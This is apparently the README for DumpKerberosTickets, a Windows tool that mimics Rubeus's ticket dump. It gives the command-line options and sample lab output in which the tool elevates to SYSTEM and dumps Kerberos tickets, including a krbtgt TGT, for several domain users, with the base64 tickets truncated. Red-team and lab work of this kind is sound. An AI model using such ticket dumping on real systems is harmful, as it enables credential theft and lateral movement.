# DumpKerberosTickets
Dump Kerberos tickets like Rubeus's dump command. 

## Usage:
```
PS> .\dumptickets.exe -h
Usage:
  dumpTickets [optional-params]
Options:
  -h, --help            print this cligen-erated help
  --help-syntax         advanced: prepend,plurals,..
  --targetUser=         Dump tickets for this user
  --targetService=      Dump tickets for this service
```

### Dumping tickets
```
PS> .\dumptickets.exe
[*] Current LUID: 0x0000000000055127
[*] Elevating to SYSTEM
[*] Got 3 tickets total for user: robb.stark

ServiceName              : krbtgt/NORTH.SEVENKINGDOMS.LOCAL
ServerRealm              : NORTH.SEVENKINGDOMS.LOCAL
UserName                 : robb.stark
StartTime                : 2025-08-04T11:15:13-07:00
EndTime                  : 2025-08-04T21:15:13-07:00
RenewUntil               : 2025-08-11T11:15:13-07:00
EncodedTicketSize        : 1460
Base64EncodedTicket      :

doIFsDCCBaygAwIBBaEDAgEWooIEiDCCBIRhgg...

[*] Got 3 tickets total for user: robb.stark

ServiceName              : LDAP/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local
ServerRealm              : NORTH.SEVENKINGDOMS.LOCAL
UserName                 : robb.stark
StartTime                : 2025-08-04T11:38:45-07:00
EndTime                  : 2025-08-04T21:15:13-07:00
RenewUntil               : 2025-08-11T11:15:13-07:00
EncodedTicketSize        : 1675
Base64EncodedTicket      :

doIGhzCCBoOgAwIBBaEDAgEWooIFNjCCBTJhg...


[*] Got 2 tickets total for user: sql_svc

ServiceName              : LDAP/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local
ServerRealm              : NORTH.SEVENKINGDOMS.LOCAL
UserName                 : sql_svc
StartTime                : 2025-08-03T07:07:32-07:00
EndTime                  : 2025-08-03T17:07:10-07:00
RenewUntil               : 2025-08-10T07:07:10-07:00
EncodedTicketSize        : 1645
Base64EncodedTicket      :

doIGaTCCBmWgAwIBBaEDAgEWooIFGzCCBRdhg...
```
